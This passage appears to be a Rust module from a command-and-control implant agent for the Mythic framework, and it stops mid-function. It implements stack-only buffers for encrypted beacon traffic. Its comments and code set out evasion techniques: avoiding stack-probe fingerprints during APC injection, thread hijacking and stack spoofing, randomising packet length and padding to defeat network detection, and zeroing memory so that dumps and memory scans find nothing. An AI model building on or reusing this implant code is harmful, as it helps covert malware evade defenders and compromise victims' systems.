// 尚未引入多线程.还是通过mythic的状态机已经实现了多线程?

// 本文件作用:杜绝通过堆分配暂存数据,而是用纯栈将数据加密发出.默认使用4kb的大小.

// 如果要修改缓冲区大小(默认4kb),只需要在 4. 【核心配置开关】全局当前激活缓冲区大小 (Active Buffer Size Knob)这里将WIRE_SIZE_4K改为WIRE_SIZE_16K/WIRE_SIZE_64K
//!
//! features
//! 1. Caller-Provided Buffer Pattern（调用者提供外包缓冲区模式） 详见buffer.md
//! 2. **规避 MSVC 栈探针 (`__chkstk`) 与 Guard Page 异常**：
//!    - 在 Windows x64 ABI 下，当函数局部变量超过 4096 字节（1 个页面）时，编译器会强制插入 `__chkstk` 探针符号以触碰 `PAGE_GUARD` 保护页，产生显著静态指纹。
//!    - 在深调用栈、APC 注入、Thread Hijacking 或 Stack Spoofing（栈伪造）场景下，宿主线程剩余可用栈极浅（可能仅有数 KB），轻量叶子栈帧可杜绝爆栈崩溃。
//! 3. **严格 3 字节对齐无填充 Base64 法则**：
//!    - 磁盘/管道原始数据单次读取上限 (`MAX_RAW_READ`) 严格向下对齐到 3 字节倍数，保证应用层内层 Base64 绝无尾部 `=` 或 `==` 填充字符，彻底消除微观流量指纹。
//! 4. **网络发包切片化与双层 Jitter 混淆**：
//!    - 栈缓冲区保上限 (`WIRE_SIZE`)，实际网络发包通过 `encode_to_slice` 仅传递有效切片；配合 `jittered_raw_read` 与 JSON 动态伪装字段 `_p`，破坏 NDR 基于固定包长的统计分析。
//! 5. **硬件级内存擦除 (Hardware Volatile Zeroization)**：
//!    - 通过 `core::ptr::write_volatile` 进行物理洗白，阻止 LLVM 作为 Dead Code 进行死码消除（Dead Code Elimination），等价于 Windows 原生 `SecureZeroMemory`，防御 Process Minidump、内存扫描与 Heap Remanence。


use base64::prelude::*;
use core::mem::MaybeUninit;
use serde::{Deserialize, Serialize};

// =========================================================================
// 1. 协议物理核心常量 (Protocol Physical & Cryptographic Constants)
/*
┌──────────────┬──────────────┬────────────────────────────┬──────────────┐
│  UUID (36B)  │   IV (16B)   │  AES Ciphertext (密文, PKCS#7 填充) │  HMAC (32B)  │
└──────────────┴──────────────┴────────────────────────────┴──────────────┘
     固定 36B        固定 16B             最小 16B (!)             固定 32B
*/
//=========================================================================

/// Agent 唯一识别符 UUID 规范长度 (36 字节 ASCII 文本)
pub const UUID_LEN: usize = 36;

/// 密码学对称加密初始向量 IV 长度 (AES-256-CBC 严格要求 16 字节)
pub const IV_LEN: usize = 16;

/// HMAC-SHA256 完整性校验签名 Tag 长度 (SHA-256 摘要 32 字节)
pub const HMAC_LEN: usize = 32;

/// AES 块分组密码长度 (16 字节)
pub const AES_BLOCK_SIZE: usize = 16;

/// PKCS#7 块填充最坏情况开销 (即使刚好对齐也必须补满整块 16 字节)
pub const PKCS7_WORST_PADDING: usize = 16;

/// 不带uuid,密文载荷区最小物理长度 (IV 16 + 最小密文块 16 + HMAC 32 = 64 字节)
pub const MIN_ENCRYPTED_PAYLOAD_LEN: usize = IV_LEN + AES_BLOCK_SIZE + HMAC_LEN;

/// 协议物理帧头部与防伪尾部固定开销 (UUID 36 + IV 16 + HMAC 32 = 84 字节)
pub const PROTOCOL_HEADER_LEN: usize = UUID_LEN + IV_LEN + HMAC_LEN;

/// 完整二进制报文最小物理长度(即空包) / 协议总安全开销 (UUID 36 + 密文载荷区 64 = 100 字节)
pub const MIN_RAW_MESSAGE_LEN: usize = UUID_LEN + MIN_ENCRYPTED_PAYLOAD_LEN;

/// 最小包含业务数据的数据包大小=完整二进制报文最小物理长度(即空包)+最少占用16B的加密后的明文区
pub const MIN_PAYLOAD_RAW_LEN:usize= PROTOCOL_HEADER_LEN + AES_BLOCK_SIZE + PKCS7_WORST_PADDING;

/// 应用层 JSON 骨架开销默认预估 (150 字节)
pub const DEFAULT_JSON_OVERHEAD: usize = 150;

/// JSON 动态混淆注入 `,"_p":""` 语法骨架字符开销 (8 字节)
pub const PADDING_FIELD_OVERHEAD: usize = 8;

/// 默认最大动态填充抖动上限 (256 字节)
pub const DEFAULT_MAX_JITTER: usize = 256;

// =========================================================================
// 2. 编译期常量计算纯函数 (Compile-Time Const Calculation Functions)
// =========================================================================

/// 校验出网(待发包)的 Base64 预算规格是否合法,可以在其他文件中复用
#[inline(always)]
pub const fn assert_valid_wire_size(wire_size: usize, json_overhead: usize) {
    // assert! 条件错误时会panic
    // 1. 这里在fn const函数中 2. assert!后续用在const _SANITY_CHECK中.而const会在编译期求值,如果条件错误会在编译时报错,导致无法编译.如果正确,其包含的明文就不会被带入编译好的二进制文件.所以这里是安全且隐蔽的.
    assert!(wire_size.is_multiple_of(4), "WIRE_SIZE 必须能被 4 整除以满足 Base64 规范");
    // 带有效载荷明文的最小数据包转为base64后大小
    assert!(
        wire_size >= MIN_PAYLOAD_RAW_LEN * 4 / 3,
        "WIRE_SIZE 过小，无法容纳协议头与最小密文"
    );
    let raw_len = calc_raw_len(wire_size);
    let cipher_len = calc_max_ciphertext_len(raw_len);
    let plaintext_len = cipher_len.saturating_sub(PKCS7_WORST_PADDING);
    assert!(plaintext_len > json_overhead, "明文容量不足以容纳 JSON 骨架开销");
}

/// 计算出网 Base64 对应的二进制物理帧总容量: (wire_size / 4) * 3
#[inline(always)]
pub const fn calc_raw_len(wire_size: usize) -> usize {
    assert!(wire_size.is_multiple_of(4), "WIRE_SIZE 必须能被 4 整除");
    (wire_size / 4) * 3
}

/// 计算指定二进制物理容量下，AES 16 字节对齐的最大密文长度
#[inline(always)]
pub const fn calc_max_ciphertext_len(raw_len: usize) -> usize {
    (raw_len.saturating_sub(PROTOCOL_HEADER_LEN) / AES_BLOCK_SIZE) * AES_BLOCK_SIZE
}

/// 计算指定二进制物理容量下，第一层明文 JSON 物理容量上限
#[inline(always)]
pub const fn calc_max_plaintext_len(raw_len: usize) -> usize {
    calc_max_ciphertext_len(raw_len).saturating_sub(PKCS7_WORST_PADDING)
}

/// 计算留给内层 Base64 的 4 字节向下对齐字符容量
#[inline(always)]
pub const fn calc_b64_aligned_capacity(plaintext_len: usize, json_overhead: usize) -> usize {
    (plaintext_len.saturating_sub(json_overhead) / 4) * 4
}

/// 计算磁盘/管道单次读取上限 (严格向下取整到 3 字节倍数，杜绝内层 Base64 '=' 填充)
#[inline(always)]
pub const fn calc_max_raw_read(plaintext_len: usize, json_overhead: usize) -> usize {
    (calc_b64_aligned_capacity(plaintext_len, json_overhead) / 4) * 3
}

/// 计算动态读取下限 (取最大读取容量的 70%，并向下保证 3 字节对齐)
#[inline(always)]
pub const fn calc_min_raw_read(max_raw_read: usize) -> usize {
    let seventy_percent = (max_raw_read * 7) / 10;
    (seventy_percent / 3) * 3
}

/// 计算明文切片经 PKCS#7 补齐后的长度 (16 字节对齐)
#[inline(always)]
pub const fn calc_padded_len(data_len: usize) -> usize {
    (data_len / AES_BLOCK_SIZE + 1) * AES_BLOCK_SIZE
}

/// 计算封包所需完整的二进制物理帧总长: UUID(36) + IV(16) + Padded(N) + HMAC(32)
#[inline(always)]
pub const fn calc_raw_total(data_len: usize) -> usize {
    PROTOCOL_HEADER_LEN + calc_padded_len(data_len)
}

// =========================================================================
// 3. 协议物理帧候选预设规格 (Physical Wire Size Candidates & Presets)
// =========================================================================

/// 常规隐蔽心跳与轻量短指令出网包上限 (4KB)
pub const WIRE_SIZE_4K: usize = 4 * 1024;
pub const RAW_LEN_4K: usize = calc_raw_len(WIRE_SIZE_4K);
pub const CIPHERTEXT_LEN_4K: usize = calc_max_ciphertext_len(RAW_LEN_4K);
pub const PLAINTEXT_LEN_4K: usize = calc_max_plaintext_len(RAW_LEN_4K);
pub const RAW_READ_4K: usize = calc_max_raw_read(PLAINTEXT_LEN_4K, DEFAULT_JSON_OVERHEAD);

/// 中型任务回显与系统枚举出网包上限 (16KB)
pub const WIRE_SIZE_16K: usize = 16 * 1024;
pub const RAW_LEN_16K: usize = calc_raw_len(WIRE_SIZE_16K);
pub const CIPHERTEXT_LEN_16K: usize = calc_max_ciphertext_len(RAW_LEN_16K);
pub const PLAINTEXT_LEN_16K: usize = calc_max_plaintext_len(RAW_LEN_16K);
pub const RAW_READ_16K: usize = calc_max_raw_read(PLAINTEXT_LEN_16K, DEFAULT_JSON_OVERHEAD);

/// 大文件传输与内存 Dump 分片出网包上限 (64KB)
pub const WIRE_SIZE_64K: usize = 64 * 1024;
pub const RAW_LEN_64K: usize = calc_raw_len(WIRE_SIZE_64K);
pub const CIPHERTEXT_LEN_64K: usize = calc_max_ciphertext_len(RAW_LEN_64K);
pub const PLAINTEXT_LEN_64K: usize = calc_max_plaintext_len(RAW_LEN_64K);
pub const RAW_READ_64K: usize = calc_max_raw_read(PLAINTEXT_LEN_64K, DEFAULT_JSON_OVERHEAD);

// =========================================================================
// 4. 【核心配置开关】全局当前激活缓冲区大小 (Active Buffer Size Knob)
// =========================================================================

pub const BUFFER_SIZE: usize = WIRE_SIZE_4K;
pub const ACTIVE_WIRE_SIZE: usize = BUFFER_SIZE;

// =========================================================================
// 5. 激活规格常量与强类型级联衍生 (Active Compile-time Derivations)
// =========================================================================

pub const MAX_B64_LEN: usize = BUFFER_SIZE;
pub const MAX_RAW_LEN: usize = calc_raw_len(BUFFER_SIZE);
pub const MAX_CIPHERTEXT_LEN: usize = calc_max_ciphertext_len(MAX_RAW_LEN);
pub const MAX_PLAINTEXT_LEN: usize = calc_max_plaintext_len(MAX_RAW_LEN);
pub const MAX_RAW_READ: usize = calc_max_raw_read(MAX_PLAINTEXT_LEN, DEFAULT_JSON_OVERHEAD);

pub type ActiveBudget = PacketBudget<BUFFER_SIZE>;
pub type Budget4K = PacketBudget<WIRE_SIZE_4K>;
pub type Budget16K = PacketBudget<WIRE_SIZE_16K>;
pub type Budget64K = PacketBudget<WIRE_SIZE_64K>;

// =========================================================================
// 6. 参数化协议预算模板 (PacketBudget Template)
// =========================================================================

/// 协议缓冲区与切片预算计算器
///
/// 利用 Rust 的 `const generics` 在编译期完成全套切片公式推导，零运行期开销。
///
/// * `WIRE_SIZE`: 网络出网目标报文总容量 (如 4KB: 4096, 16KB: 16384, 64KB: 65536)
/// * `JSON_OVERHEAD`: 应用层 JSON 骨架开销预估 (默认 150 字节)
pub struct PacketBudget<const WIRE_SIZE: usize, const JSON_OVERHEAD: usize = DEFAULT_JSON_OVERHEAD>;

impl<const WIRE_SIZE: usize, const JSON_OVERHEAD: usize> PacketBudget<WIRE_SIZE, JSON_OVERHEAD> {
    // ----------------- 编译期内部静态断言 -----------------
    const _SANITY_CHECK: () = {
        assert_valid_wire_size(WIRE_SIZE, JSON_OVERHEAD);
    };

    // ----------------- 公共导出常量 -----------------
    /// 网络 Base64 缓冲区上限 (等于目标出网包预算)
    pub const MAX_B64_LEN: usize = WIRE_SIZE;

    /// 二进制物理帧暂存区上限 (Base64 解码后容量: WIRE_SIZE * 3 / 4)
    pub const MAX_RAW_LEN: usize = {
        let () = Self::_SANITY_CHECK;
        calc_raw_len(WIRE_SIZE)
    };

    /// 密文区(base64解码后) 16 字节对齐的最大值 (采用 saturating_sub 防溢出)
    pub const MAX_CIPHERTEXT_LEN: usize = calc_max_ciphertext_len(Self::MAX_RAW_LEN);

    /// 第一层明文 JSON 的物理容量上限 (扣除 16B PKCS#7 保证加密后密文不溢出)
    pub const MAX_PLAINTEXT_LEN: usize = calc_max_plaintext_len(Self::MAX_RAW_LEN);

    /// JSON 中留给 Base64 编码的 4B 对齐字符容量.解密后base64是4字节对齐的
    pub const B64_ALIGNED_CAPACITY: usize =
        calc_b64_aligned_capacity(Self::MAX_PLAINTEXT_LEN, JSON_OVERHEAD);

    /// 磁盘/管道原始数据单次读取上限 (Raw Read: 严格 3 字节对齐，内层 Base64 绝无 '=' 填充)
    pub const MAX_RAW_READ: usize =
        calc_max_raw_read(Self::MAX_PLAINTEXT_LEN, JSON_OVERHEAD);

    pub const PADDING_FIELD_OVERHEAD: usize = PADDING_FIELD_OVERHEAD;
    pub const DEFAULT_MAX_JITTER: usize = DEFAULT_MAX_JITTER;

    // ----------------- 动态切片与 Jitter 算法 -----------------
    /// 动态获取读取下限（取最大容量的 70%，并向下保证 3 字节对齐）
    #[inline(always)]
    pub const fn min_raw_read() -> usize {
        calc_min_raw_read(Self::MAX_RAW_READ)
    }

    /// 用于大文件传输工况
    /// 在base64编码前,计算带抖动的单次读取容量（兼顾高吞吐与防固定包长指纹特征）.每次读取随机大小的数据,且该值不能太小(效率低),不能太大(不能超过MAX_RAW_READ上限),必须是3的倍数(base64的对齐要求,避免出现=/==的填充)
    /// 那么min_raw_read()代表最小值,MAX_RAW_READ代表最大值.
    /// 严格向下取整到 3 的倍数，消除内层 Base64 '=' 填充
    pub fn jittered_raw_read() -> usize {
        // 函数名应该全是小写,即使是const函数
        let min_read = Self::min_raw_read();
        let max_read = Self::MAX_RAW_READ;

        if min_read >= max_read {
            return max_read;
        }

        // 计算最小和最大值之间有多少可选择的的值.最大和最小相减后,需要加1才是可用的区间.(如 [3-5],有3,4,5可用,但5-3=2)
        let span = max_read - min_read + 1;
        // 取余数.该余数代表循环之后,从起点min_read往前的偏移,且.该余数加上基准值min_read后,永不会超过max_read
        let pick = min_read + ((rand::random::<u32>() as usize) % span);
        (pick / 3) * 3
    }

    /// 用于心跳包等短指令工况
    /// 动态计算当前 Payload 还允许塞入多少随机 Padding 字符 (具备自适应熔断能力)
    ///
    /// * `raw_json_len`: 未注入 padding 字段前的原始 JSON 字符串长度
    /// * `max_jitter`: 本次抖动的最大边界建议值 (传 None 时使用 DEFAULT_MAX_JITTER(256)；传 Some(0) 显式禁用,传 Some(64)：表示建议这次最多抖动 64 字节)
    pub fn get_random_padding_len(raw_json_len: usize, max_jitter: Option<usize>) -> usize {
        // 1. 扣除 JSON 语法开销，计算物理剩余可用容量
        let avail_space = Self::MAX_PLAINTEXT_LEN
            .saturating_sub(raw_json_len)
            .saturating_sub(Self::PADDING_FIELD_OVERHEAD);

        // 2. 提取上限：若显式传 Some(0)，代表调用者要求关闭抖动，直接熔断返回 0
        let cap = match max_jitter {
            Some(0) => return 0,
            Some(limit) => limit,
            None => Self::DEFAULT_MAX_JITTER,
        };

        // 3. 计算本轮有效上限 (取物理剩余可用容量与调用者配额的最小值)
        let upper_bound = avail_space.min(cap);

        // 4. 混淆下限为 8 字节；若可用空间或调用者配额不足 8 字节，则放弃混淆返回 0.因为aes是16字节对齐,小于8字节,并不能能起到打乱密文块长度的作用.因此放弃
        if upper_bound < 8 {
            return 0;
        }

        8 + ((rand::random::<u32>() as usize) % (upper_bound - 8 + 1))
    }

    /// 给报文注入内容进行填充的具体方式.【100% 零堆分配】高效生成轻量随机 ASCII 伪装切片
    ///
    /// * `out_buf`: 调用者在栈上准备的可变字节缓冲区切片
    /// * `len`: 本轮所需填充的随机字符长度
    #[inline]
    pub fn generate_padding_slice(
        out_buf: &mut [u8],
        len: usize,
    ) -> Option<&str> {
        if len == 0 || len > out_buf.len() {
            return None;
        }

        const CHARSET: &[u8] =
            b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

        // 直接在传入的栈切片上原地写入随机 ASCII 字符.写入头部(out_buf[..len])
        for byte in out_buf[..len].iter_mut() {
            // Rust 1.94 现代写法.rand::random::<u8>()随机产生一个u8类型的正整数(0-255).对该正整数取CHARSET.len (62)的余数.产生的数一定落在[0-61]之间,之后将对应的 CHARSET中字符插入头部.
            let idx = (rand::random::<u8>() as usize) % CHARSET.len();
            *byte = CHARSET[idx];
        }

        // 在头部插入随机ascii字符,构建完整的填充后的字符串
        // CHARSET 均为合法 ASCII，此转换 100% 安全且没有任何堆分配与内存拷贝.通过引用的方式写入源字符串的头部,零内存拷贝,零堆分配.
        core::str::from_utf8(&out_buf[..len]).ok()
    }
}

// ==========================================
// 3. 动态分片编码 (Dynamic Slice Encoding)
// ==========================================

/// 将密文帧编码至调用者提供的栈缓冲区，并返回零拷贝有效切片引用
///
/// 核心准则：栈缓冲区保上限，网络发包切片化。实际发送时严禁发送整个定长缓冲区，必须只发送实际编码后的动态长度切片。
///
/// * `input`: 待编码的二进制数据切片
/// * `wire_buf`: 调用者提供的定长栈/静态输出缓冲区 (例如 4096 字节)
/// * 返回: 写入有效长度的字符切片引用 (`&'a [u8]`)，100% 零堆分配、零内存复制
#[inline]
pub fn encode_to_slice<'a>(
    input: &[u8],
    wire_buf: &'a mut [u8],
) -> Result<&'a [u8], base64::EncodeSliceError> {
    let written = BASE64_STANDARD.encode_slice(input, wire_buf)?;
    Ok(&wire_buf[..written])
}

// ==========================================
// 4. 硬件级内存擦除工具 (Hardware Volatile Zeroization)
// ==========================================

/// 硬件级字节切片内存物理擦除
///
/// 使用 `write_volatile` 强制逐字节写入 0，阻止 LLVM/编译器将其作为无意义死码消除 (Dead Code Elimination)。
/// 功能等价于 Windows 原生 `RtlSecureZeroMemory` / `SecureZeroMemory`。
#[inline(always)]
pub fn zeroize_slice(buf: &mut [u8]) {
    for byte in buf.iter_mut() {
        unsafe {
            core::ptr::write_volatile(byte, 0);
        }
    }
}

// ==========================================
// 5. 栈上固定容量向量 (Zero-Heap Stack Vector)
// ==========================================

/// 栈上固定容量向量 (Zero-Heap Stack Vector)
///
/// 彻底替换 `alloc::vec::Vec` 在零拷贝通信切片反序列化过程中的堆分配需求。
/// 内部数据完全存在于栈帧内存中，提供与 Vec 兼容的切片操作接口与 Serde Deserialize 实现。
pub struct StackVec<T, const N: usize> {
    data: [MaybeUninit<T>; N],
    len: usize,
}

impl<T, const N: usize> StackVec<T, N> {
    #[inline(always)]
    pub const fn new() -> Self {
        Self {
            data: [const { MaybeUninit::uninit() }; N],
            len: 0,
        }
    }

    #[inline]
    pub fn push(&mut self, item: T) -> Result<(), T> {
        if self.len < N {
            self.data[self.len].write(item);
            self.len += 1;
            Ok(())
        } else {
            Err(item)
        }
    }

    #[inline(always)]
    pub fn len(&self) -> usize {
        self.len
    }

    #[inline(always)]
    pub fn is_empty(&self) -> bool {
        self.len == 0
    }

    #[inline(always)]
    pub fn capacity(&self) -> usize {
        N
    }

    #[inline]
    pub fn pop(&mut self) -> Option<T> {
        if self.len > 0 {
            self.len -= 1;
            unsafe {
                Some(self.data[self.len].assume_init_read())
            }
        } else {
            None
        }
    }

    #[inline]
    pub fn clear(&mut self) {
        while self.len > 0 {
            self.len -= 1;
            unsafe {
                core::ptr::drop_in_place(self.data[self.len].as_mut_ptr());
            }
        }
    }

    #[inline(always)]
    pub fn as_slice(&self) -> &[T] {
        unsafe {
            core::slice::from_raw_parts(self.data.as_ptr().cast::<T>(), self.len)
        }
    }

    #[inline(always)]
    pub fn as_mut_slice(&mut self) -> &mut [T] {
        unsafe {
            core::slice::from_raw_parts_mut(self.data.as_mut_ptr().cast::<T>(), self.len)
        }
    }
}

impl<T: Clone, const N: usize> Clone for StackVec<T, N> {
    fn clone(&self) -> Self {
        let mut new_vec = Self::new();
        for item in self.as_slice() {
            let _ = new_vec.push(item.clone());
        }
        new_vec
    }
}

impl<T: PartialEq, const N: usize> PartialEq for StackVec<T, N> {
    fn eq(&self, other: &Self) -> bool {
        self.as_slice() == other.as_slice()
    }
}

impl<T: Eq, const N: usize> Eq for StackVec<T, N> {}

#[cfg(any(debug_assertions, test))]
impl<T: core::fmt::Debug, const N: usize> core::fmt::Debug for StackVec<T, N> {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        self.as_slice().fmt(f)
    }
}

impl<T, const N: usize> Drop for StackVec<T, N> {
    fn drop(&mut self) {
        self.clear();
    }
}

impl<T, const N: usize> Extend<T> for StackVec<T, N> {
    fn extend<I: IntoIterator<Item = T>>(&mut self, iter: I) {
        for item in iter {
            if self.push(item).is_err() {
                break;
            }
        }
    }
}

impl<T, const N: usize> Default for StackVec<T, N> {
    fn default() -> Self {
        Self::new()
    }
}

impl<T, const N: usize> core::ops::Deref for StackVec<T, N> {
    type Target = [T];
    #[inline(always)]
    fn deref(&self) -> &[T] {
        self.as_slice()
    }
}

impl<T, const N: usize> core::ops::DerefMut for StackVec<T, N> {
    #[inline(always)]
    fn deref_mut(&mut self) -> &mut [T] {
        self.as_mut_slice()
    }
}

impl<'a, T, const N: usize> IntoIterator for &'a StackVec<T, N> {
    type Item = &'a T;
    type IntoIter = core::slice::Iter<'a, T>;
    #[inline(always)]
    fn into_iter(self) -> Self::IntoIter {
        self.as_slice().iter()
    }
}

impl<'a, T, const N: usize> IntoIterator for &'a mut StackVec<T, N> {
    type Item = &'a mut T;
    type IntoIter = core::slice::IterMut<'a, T>;
    #[inline(always)]
    fn into_iter(self) -> Self::IntoIter {
        self.as_mut_slice().iter_mut()
    }
}

struct StackVecVisitor<T, const N: usize>(core::marker::PhantomData<fn() -> T>);

impl<'de, T: Deserialize<'de>, const N: usize> serde::de::Visitor<'de> for StackVecVisitor<T, N> {
    type Value = StackVec<T, N>;

    fn expecting(&self, formatter: &mut core::fmt::Formatter) -> core::fmt::Result {
        write!(formatter, "a sequence of up to {} elements", N)
    }

    fn visit_seq<A>(self, mut seq: A) -> Result<Self::Value, A::Error>
    where
        A: serde::de::SeqAccess<'de>,
    {
        let mut vec = StackVec::new();
        while let Some(element) = seq.next_element()? {
            if vec.push(element).is_err() {
                while seq.next_element::<serde::de::IgnoredAny>()?.is_some() {}
                break;
            }
        }
        Ok(vec)
    }
}

impl<'de, T: Deserialize<'de>, const N: usize> Deserialize<'de> for StackVec<T, N> {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        deserializer.deserialize_seq(StackVecVisitor::<T, N>(core::marker::PhantomData))
    }
}

impl<T: Serialize, const N: usize> Serialize for StackVec<T, N> {
    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: serde::Serializer,
    {
        self.as_slice().serialize(serializer)
    }
}

// ==========================================
// 6. 预先分配的大栈缓冲区 (Stack Arena Buffer)
// ==========================================

/// 预先分配的大栈缓冲区 (Stack Arena Buffer)
///
/// 从栈内存中划出连续字节切片，擦除时直接把 Offset 清零，杜绝所有堆分配与 Heap Remanence。
pub struct StackArena<const CAP: usize> {
    buf: [u8; CAP],
    offset: usize,
}

impl<const CAP: usize> StackArena<CAP> {
    #[inline(always)]
    pub const fn new() -> Self {
        Self {
            buf: [0u8; CAP],
            offset: 0,
        }
    }

    #[inline]
    pub fn alloc_slice(&mut self, len: usize) -> Option<&mut [u8]> {
        if self.offset.saturating_add(len) > CAP {
            return None;
        }
        let start = self.offset;
        let end = start + len;
        self.offset = end;
        Some(&mut self.buf[start..end])
    }

    #[inline(always)]
    pub fn used_slice(&self) -> &[u8] {
        &self.buf[..self.offset]
    }

    #[inline(always)]
    pub fn used_slice_mut(&mut self) -> &mut [u8] {
        let off = self.offset;
        &mut self.buf[..off]
    }

    #[inline(always)]
    pub fn offset(&self) -> usize {
        self.offset
    }

    #[inline(always)]
    pub fn remaining(&self) -> usize {
        CAP.saturating_sub(self.offset)
    }

    #[inline(always)]
    pub fn zeroize_and_reset(&mut self) {
        if self.offset > 0 {
            zeroize_slice(&mut self.buf[..self.offset]);
            self.offset = 0;
        }
    }
}

impl<const CAP: usize> Drop for StackArena<CAP> {
    fn drop(&mut self) {
        zeroize_slice(&mut self.buf);
        self.offset = 0;
    }
}

impl<const CAP: usize> Default for StackArena<CAP> {
    #[inline(always)]
    fn default() -> Self {
        Self::new()
    }
}

// ==========================================
// 7. 调用者通用纯栈工作区模板 (Generic Stack Workspace)
// ==========================================

/// 调用者通用纯栈工作区模板 (Generic Stack Workspace)
///
/// 封装收发计算工作面，支持由调用者自由选择分配在栈上、全局静态区或堆中。
/// 离开作用域时自动触发物理清零，完全阻断内存敏感数据残留。
pub struct StackWorkspace<const RAW_LEN: usize, const B64_LEN: usize> {
    /// 原始二进制组装/解密缓冲区
    pub raw_buf: [u8; RAW_LEN],
    /// 内层分片专用 Base64 缓冲区 (彻底隔离内层文件分片与外层传输包，杜绝借用生命周期冲突与踩踏)
    pub chunk_buf: [u8; B64_LEN],
    /// Base64 编码输入/输出缓冲区 (用于网络层物理封包)
    pub b64_buf: [u8; B64_LEN],
}

impl<const RAW_LEN: usize, const B64_LEN: usize> StackWorkspace<RAW_LEN, B64_LEN> {
    #[inline(always)]
    pub const fn new() -> Self {
        Self {
            raw_buf: [0u8; RAW_LEN],
            chunk_buf: [0u8; B64_LEN],
            b64_buf: [0u8; B64_LEN],
        }
    }

    /// 原地物理擦除所有缓冲区
    #[inline(always)]
    pub fn zeroize(&mut self) {
        zeroize_slice(&mut self.raw_buf);
        zeroize_slice(&mut self.chunk_buf);
        zeroize_slice(&mut self.b64_buf);
    }
}

impl<const RAW_LEN: usize, const B64_LEN: usize> Drop for StackWorkspace<RAW_LEN, B64_LEN> {
    fn drop(&mut self) {
        self.zeroize();
    }
}

impl<const RAW_LEN: usize, const B64_LEN: usize> Default for StackWorkspace<RAW_LEN, B64_LEN> {
    #[inline(always)]
    fn default() -> Self {
        Self::new()
    }
}

// =========================================================================
// 8. 激活规格类型别名与纯栈工作区模板衍生 (Active Derivations & Workspace Aliases)
// =========================================================================

pub type RawBuffer = [u8; MAX_RAW_LEN];
pub type B64Buffer = [u8; MAX_B64_LEN];
pub type ActiveStackWorkspace = StackWorkspace<MAX_RAW_LEN, MAX_B64_LEN>;
pub type DefaultStackWorkspace = ActiveStackWorkspace;
pub type StackWorkspace4K = StackWorkspace<RAW_LEN_4K, WIRE_SIZE_4K>;
pub type StackWorkspace16K = StackWorkspace<RAW_LEN_16K, WIRE_SIZE_16K>;
pub type StackWorkspace64K = StackWorkspace<RAW_LEN_64K, WIRE_SIZE_64K>;

// ==========================================
// 9. 单元测试模块 (Unit Tests)
// ==========================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_packet_budget_derivation() {
        type Budget4K = PacketBudget<4096>;
        // 4K 规格验证
        assert_eq!(Budget4K::MAX_B64_LEN, 4096);
        assert_eq!(Budget4K::MAX_RAW_LEN, 3072);
        assert_eq!(Budget4K::MAX_PLAINTEXT_LEN, 2960);
        assert_eq!(Budget4K::MAX_RAW_READ, 2106);
        assert_eq!(Budget4K::MAX_RAW_READ % 3, 0); // 3 字节严格对齐验证

        type Budget16K = PacketBudget<16384>;
        // 16K 规格验证
        assert_eq!(Budget16K::MAX_B64_LEN, 16384);
        assert_eq!(Budget16K::MAX_RAW_LEN, 12288);
        assert_eq!(Budget16K::MAX_PLAINTEXT_LEN, 12176);
        assert_eq!(Budget16K::MAX_RAW_READ, 9018);
        assert_eq!(Budget16K::MAX_RAW_READ % 3, 0);

        type Budget64K = PacketBudget<65536>;
        // 64K 规格验证
        assert_eq!(Budget64K::MAX_B64_LEN, 65536);
        assert_eq!(Budget64K::MAX_RAW_LEN, 49152);
        assert_eq!(Budget64K::MAX_PLAINTEXT_LEN, 49040);
        assert_eq!(Budget64K::MAX_RAW_READ, 36666);
        assert_eq!(Budget64K::MAX_RAW_READ % 3, 0);
    }

    #[test]
    fn test_jittered_raw_read() {
        type Budget4K = PacketBudget<4096>;
        type Budget16K = PacketBudget<16384>;
        for _ in 0..100 {
            let r4 = Budget4K::jittered_raw_read();
            assert!(r4 >= Budget4K::min_raw_read());
            assert!(r4 <= Budget4K::MAX_RAW_READ);
            assert_eq!(r4 % 3, 0, "4K 抖动读取必须为 3 的倍数以避免 Base64 '=' 填充");

            let r16 = Budget16K::jittered_raw_read();
            assert!(r16 >= Budget16K::min_raw_read());
            assert!(r16 <= Budget16K::MAX_RAW_READ);
            assert_eq!(r16 % 3, 0);
        }
    }

    #[test]
    fn test_encode_to_slice() {
        let raw = b"Wisconsin C2 Protocol Test";
        let mut wire_buf = [0u8; 128];
        let slice = encode_to_slice(raw, &mut wire_buf).expect("encode slice");
        assert_eq!(slice, b"V2lzY29uc2luIEMyIFByb3RvY29sIFRlc3Q=");
        assert_eq!(slice.len(), 36);
    }

    #[test]
    fn test_random_padding_and_generation() {
        type Budget4K = PacketBudget<4096>;
        let raw_json_len = 100;
        let pad_len = Budget4K::get_random_padding_len(raw_json_len, Some(64));
        assert!(pad_len >= 8);
        assert!(pad_len <= 64);

        // 1. 【100% 零堆分配】栈切片填充测试
        let mut pad_buf = [0u8; 128];
        let pad_slice = Budget4K::generate_padding_slice(&mut pad_buf, pad_len).expect("padding slice");
        assert_eq!(pad_slice.len(), pad_len);
        assert!(pad_slice.chars().all(|c| c.is_ascii_alphanumeric()));

        // 2. 边界与容量溢出安全防护
        let mut small_buf = [0u8; 4];
        assert!(Budget4K::generate_padding_slice(&mut small_buf, 8).is_none());
        assert!(Budget4K::generate_padding_slice(&mut small_buf, 0).is_none());

        // 3. 极端空间压迫下的自适应熔断测试
        let tight_len = Budget4K::MAX_PLAINTEXT_LEN - 5;
        assert_eq!(Budget4K::get_random_padding_len(tight_len, None), 0);

        // 4. 显式禁用抖动与不足 8 字节混淆阈值的熔断测试
        assert_eq!(Budget4K::get_random_padding_len(raw_json_len, Some(0)), 0);
        assert_eq!(Budget4K::get_random_padding_len(raw_json_len, Some(5)), 0);
    }

    #[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
    #[cfg_attr(any(debug_assertions, test), derive(Debug))]
    struct MessagePayload<'a> {
        #[serde(borrow)]
        task_id: &'a str,
        #[serde(borrow)]
        cmd: &'a str,
        #[serde(borrow)]
        result: &'a str,
        #[serde(borrow, skip_serializing_if = "Option::is_none", default)]
        _p: Option<&'a str>,
    }

    impl<'a> MessagePayload<'a> {
        fn new(task_id: &'a str, cmd: &'a str, result: &'a str) -> Self {
            Self {
                task_id,
                cmd,
                result,
                _p: None,
            }
        }
        fn with_padding(mut self, padding: Option<&'a str>) -> Self {
